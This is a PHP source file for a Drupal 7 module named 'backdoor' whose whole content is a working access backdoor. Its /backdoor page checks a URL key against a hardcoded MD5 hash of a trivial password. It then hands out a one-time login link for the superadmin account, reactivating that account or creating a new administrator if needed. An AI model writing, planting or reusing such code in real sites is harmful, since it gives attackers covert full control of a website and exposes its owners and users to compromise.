<?php

require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');

function backdoor_menu() {
	$items = array();

	$items['backdoor'] = array(
		'title' => 'Backdoor page',
		'description' => 'Here generating one time link for login',
		'page callback' => 'backdoor',
		'access callback' => 'access_backdoor_page',
		'type' => MENU_NORMAL_ITEM,
	);

	$items['admin/config/system/backdoor'] = array(
		'title' => 'Backdoor settings',
		'description' => 'Администрирование модуля Backdoor',
		'page callback' => 'admin_page_backdoor',
		'access arguments' => array('administer site configuration'),
		'type' => MENU_NORMAL_ITEM,
	);

	return $items;
}

function access_backdoor_page() {
	if (isset($_GET['key'])) {
		$key = md5($_GET['key']);
		if ($key == '81dc9bdb52d04dc20036dbd8313ed055') {
			return TRUE;
		}
	}
}

function backdoor() {

	if ($user = user_load(1)) {

		if ($user->status != 1) {
			$user->status = 1;
			user_save($user);
		}
		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));

	} else {
		$pass = user_password(25);

		$new_password = user_hash_password(trim($pass));

		$newuser = new stdClass();
		$newuser->uid = 1;
		$newuser->name = 'admin';
		$newuser->pass = $new_password;
		$newuser->mail = 'email@example.com';
		$newuser->init = 'email@example.com';
		$newuser->status = 1;
		$newuser->role = array(
			DRUPAL_AUTHENTICATED_RID => TRUE,
			'administrator' => TRUE,
		);
		drupal_write_record('users', $newuser);
		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
	}

	return $link;
}

function admin_page_backdoor() {
	return user_hash_password(1234);
}